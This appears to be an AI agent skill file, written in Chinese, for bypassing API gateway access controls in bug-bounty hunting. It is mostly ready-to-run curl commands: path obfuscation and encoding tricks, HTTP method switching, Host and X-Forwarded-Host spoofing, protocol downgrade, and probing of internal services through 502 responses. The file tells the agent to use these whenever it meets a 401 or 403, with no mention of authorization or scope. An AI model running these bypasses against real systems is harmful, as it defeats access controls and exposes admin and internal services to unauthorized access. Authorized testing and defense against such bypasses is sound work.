---
name: api-gateway-bypass
description: API网关绕过——502/401/403绕过、路径混淆、Host头、HTTP方法。Use when 网关拦截/401/403/需要访问隐藏API。
---

# API 网关绕过

> 蒸馏自CC挖洞武器库 api-gateway-bypass-playbook（实战验证）

## 5种绕过原理

| # | 原理 | 方法 |
|---|---|---|
| 1 | 路径混淆 | /api/admin vs /api//admin、/API/admin、/api/./admin、/api/%61dmin |
| 2 | URL编码差异 | 网关解码一次 vs 后端解码两次（%252e%252e%252f） |
| 3 | 大小写绕过 | /Admin /ADMIN /aDmIn（网关规则小写，后端不区分） |
| 4 | Host头伪造 | 网关按Host路由，改Host指向内部服务 |
| 5 | 方法差异 | OPTIONS/PATCH/HEAD 绕过（网关只拦GET/POST） |

## 实战命令

```bash
# 路径混淆变体（403/401时逐个试）
curl http://T/api/admin
curl http://T/api//admin
curl http://T/api/./admin
curl http://T/api/%61dmin        # a的URL编码
curl http://T/API/admin          # 大小写
curl http://T/api/admin/         # 尾斜杠
curl http://T/api/admin%00       # 空字节（Java）
curl http://T/api/..;/admin      # 分号路径（Java/Spring）

# 方法绕过
curl -X OPTIONS http://T/api/admin
curl -X PATCH http://T/api/admin
curl -X HEAD http://T/api/admin

# Host头伪造
curl -H "Host: internal-service" http://T/
curl -H "X-Forwarded-Host: internal" http://T/

# 协议降级：HTTP/1.0、HTTP/0.9（部分网关不拦）
curl --http1.0 http://T/api/admin
```

## 网关识别

```bash
# 响应头特征：X-Kong-Proxy-Latency、Via: 1.1 kong、Server: Tengine/nginx
# 403页面特征：阿里云WAF/腾讯云WAF/Cloudflare
# 502：网关在后端不可达时的表现（可探测内网服务存在性）
```

## 502/503利用（网关探测）

- 502 = 后端连接失败：改Host/路径探测内网服务（网关当代理）
- 503 = 服务不可用：重试/改方法可能绕过

## 提交要点

- 网关绕过访问管理接口 = 中危-高危（未授权）
- 需证明绕过后访问到的东西有实际危害
- 纯403→200但无敏感内容 = 低危可能不收
